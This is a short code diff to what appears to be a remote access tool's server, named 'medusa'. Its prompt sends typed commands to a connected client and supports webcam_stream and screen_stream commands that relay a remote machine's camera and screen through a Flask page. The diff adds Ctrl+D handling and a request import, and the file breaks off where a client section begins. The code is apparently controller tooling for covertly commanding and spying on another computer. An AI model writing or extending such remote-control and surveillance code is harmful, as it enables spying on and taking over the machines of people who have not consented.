@@ -1,7 +1,7 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, render_template_string
+from flask import Flask, Response, render_template_string, request
 from colorama import Fore, Style, init
 import cv2
 import numpy as np
@@ -65,11 +65,19 @@ def generate_frames(client_socket):
 
 def handle_client(client_socket):
     while True:
-        command = input(Fore.MAGENTA + "medusa > ")
+        try:
+            command = input(Fore.MAGENTA + "medusa > ")
+        except EOFError:
+            # Handle CTRL+D
+            stop_server()
+            print(Fore.RED + "[ * ] Server stopped.")
+            continue
+        
         if command == "CTRL+P":
             stop_server()
             print(Fore.RED + "[ * ] Server stopped.")
             continue
+        
         client_socket.send(command.encode('utf-8'))
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
             mode = command.split('_')[0]
@@ -96,7 +104,7 @@ def main():
 
 if __name__ == "__main__":
     main()
-
+    
 #client
 
 import socket
